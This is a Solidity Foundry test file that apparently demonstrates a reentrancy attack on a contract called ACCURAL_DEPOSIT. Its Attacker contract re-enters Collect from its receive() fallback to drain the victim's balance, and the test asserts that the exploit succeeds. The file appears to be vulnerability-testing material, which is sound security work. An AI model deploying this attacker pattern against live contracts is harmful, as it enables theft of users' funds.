
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ACCURAL_DEPOSIT} from "../src/ACCURAL_DEPOSIT.sol";
import {LogFile} from "../src/LogFile.sol";

contract TestReentrancyACCURAL_DEPOSIT is Test {
    ACCURAL_DEPOSIT public _contractUnderTest;
    LogFile public _logFile;
    Attacker public _attacker;

    function setUp() public {
        _logFile = new LogFile();
        _contractUnderTest = new ACCURAL_DEPOSIT();
        _contractUnderTest.SetLogFile(address(_logFile));
        _contractUnderTest.SetMinSum(1);
        _contractUnderTest.Initialized();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0 && attackVal <= type(uint128).max);
        vm.assume(attackVal % 2 == 0);

        vm.deal(address(_contractUnderTest), attackVal);
        vm.deal(address(_attacker), attackVal);
        vm.deal(address(this), attackVal);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ACCURAL_DEPOSIT public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedWithdrawalAmount;

    constructor(address victimAddress) {
        victim = ACCURAL_DEPOSIT(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        require(msg.value == val, "Incorrect payment");
        attackCallCount = 0;
        exploitSucceeded = false;
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        uint256 withdrawalAmount = val / 2;
        storedWithdrawalAmount = withdrawalAmount;
        initialSnapshot = address(this).balance;
        attackCallCount = 1;
        victim.Collect(withdrawalAmount);
        
        uint256 finalBalance = address(this).balance;
        uint256 victimBalance = address(victim).balance;
        uint256 attackerVictimBalance = victim.balances(address(this));
        
        if (finalBalance >= initialSnapshot + val && attackerVictimBalance == 0 && victimBalance == 0) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            victim.Collect(storedWithdrawalAmount);
        }
    }
}
